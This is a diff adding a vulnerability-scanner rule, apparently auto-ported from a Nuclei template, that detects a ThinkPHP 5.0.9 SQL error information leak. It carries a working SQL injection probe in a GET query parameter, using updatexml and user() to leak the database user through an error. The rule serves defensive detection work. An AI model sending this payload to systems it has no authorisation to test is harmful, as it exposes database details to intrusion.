@@ -1,0 +1,30 @@
+schema_version: 1
+id: "cortex.community:thinkphp-509-information-disclosure"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "ThinkPHP 5.0.9 - Information Disclosure"
+  description: "ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/in-sqlinjection"
+  tags: ["thinkphp", "vulhub", "sqli", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Critical"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "SQLSTATE" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "XPATH syntax error" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 500 } }
